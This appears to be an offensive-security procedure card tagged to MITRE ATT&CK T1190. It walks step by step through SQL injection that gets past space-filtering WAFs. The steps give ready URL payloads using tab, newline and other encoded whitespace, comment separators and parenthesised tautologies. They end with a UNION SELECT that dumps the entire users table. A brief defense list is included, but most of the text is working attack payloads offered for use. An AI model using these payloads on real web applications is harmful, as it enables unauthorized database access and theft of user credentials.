---
id: dc43f855-8755-482d-bc0b-9a60c9788959
name: SQL-Injection-Bypassing-Space-Filter-and-Selecting-All-Users
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:36.676222+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - >-
    [[techniques/Exploitation of Remote Services|T1190 - Exploit Public-Facing
    Application]]
sub_techniques: []
tags:
  - '[[tags/SQL Injection]]'
  - '[[tags/WAF Bypass]]'
  - '[[tags/Whitespace Alternatives]]'
commands: []
platforms:
  - Web
tools: []
validated: true
---

# SQL-Injection-Bypassing-Space-Filter-and-Selecting-All-Users

## Summary

This procedure demonstrates how to perform SQL injection attacks on web applications protected by a Web Application Firewall (WAF) that filters out traditional space characters. By using alternative whitespace representations, SQL comments, and parentheses, attackers can bypass these filters to inject malicious SQL code, ultimately extracting sensitive data such as all user records from the database.

## Description

SQL injection remains one of the most common web vulnerabilities, allowing attackers to interfere with database queries by injecting malicious SQL code into input fields. In scenarios where a WAF blocks spaces (e.g., %20 in URLs), this procedure outlines bypass techniques using URL-encoded alternative whitespaces (like tab or newline characters), inline comments to separate tokens, and parentheses to restructure queries without spaces. The target is typically a login or search form in a web application backed by an SQL database like MySQL or PostgreSQL. Success enables unauthorized data access, such as dumping user credentials, leading to potential account takeover or further lateral movement. This technique assumes the application uses dynamic SQL queries without proper parameterization.

## Requirements

1. Access to a vulnerable web application with a known SQL injection point (e.g., via a parameter like ?id=1).
2. Basic knowledge of SQL syntax and URL encoding.
3. A web browser or proxy tool like Burp Suite for intercepting and modifying requests.
4. Internet access to test against the target.

## Defense

- Implement prepared statements and parameterized queries in application code to prevent injection.
- Deploy an advanced WAF configured to detect alternative whitespace, comments, and encoding obfuscations in SQL payloads.
- Conduct regular code reviews, input validation, and penetration testing to identify injection points.
- Enable database logging and monitoring for anomalous queries, such as those returning large result sets.

## Objectives

1. Bypass WAF space filters using alternative encodings and syntax tricks.
2. Inject SQL code to manipulate queries and extract data.
3. Retrieve all user records from the database to achieve data exfiltration.

## Instructions

### Step 1: Bypass Space Filter with Alternative Whitespace Characters

**Context**: Many WAFs filter standard spaces (%20) but overlook URL-encoded alternatives like tabs (%09) or carriage returns (%0D). Use this to separate SQL keywords in the injection payload, testing if the query executes without errors.

**Code** ([[codes/SQL-Injection-Alternative-Whitespaces-Bypass]]):

```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```

> Append these payloads to the vulnerable URL parameter (e.g., http://target.com/page?id=...). If successful, the page loads normally without errors, indicating the bypass works. This confirms the injection point is viable for further exploitation.

### Step 2: Use SQL Comments to Separate Tokens

**Context**: If whitespace alternatives fail, employ SQL comments (/* */) to act as separators between keywords like 'AND' and '1=1', effectively bypassing space requirements while keeping the query syntactically valid.

**Code** ([[codes/SQL-Injection-Comments-Bypass]]):

```sql
?id=1/*comment*/and/**/1=1/**/--
```

> Inject this into the URL parameter. The comments are ignored by the database parser, allowing the 'AND 1=1' condition to always evaluate true. Expected success: The application returns results as if no filter was present, confirming comment-based bypass.

### Step 3: Restructure Query with Parentheses

**Context**: Parentheses can enclose and balance expressions without needing spaces, tricking the WAF into allowing the injection. This alters the query logic to return unintended results, such as all records.

**Code** ([[codes/SQL-Injection-Parentheses-Bypass]]):

```sql
?id=(1)and(1)=(1)--
```

> Modify the URL parameter with this payload. The parentheses force the query to interpret as a tautology, bypassing authentication or filters. Success: The response includes data beyond the intended single record, indicating partial query control.

### Step 4: Extract All User Data

**Context**: Once bypass is confirmed, escalate to dumping the entire users table. Use UNION-based injection to select all columns from the users table, assuming the original query returns a single integer (adjust based on error responses).

**Instructions**: Build on a working bypass (e.g., from Step 1-3) by appending a UNION SELECT statement. First, determine the number of columns in the original query by testing UNION SELECT 1,2,3-- incrementally until no error. Then, replace with actual table data.

Example Payload (inline SQL, adjust column count):

```sql
?id=1%09UNION%09SELECT%09*,NULL%09FROM%09users--
```

> Submit via the URL. This appends a full table dump to the legitimate results. If the database is MySQL, ensure the SELECT matches the original query's column types (e.g., add NULL for non-string columns).
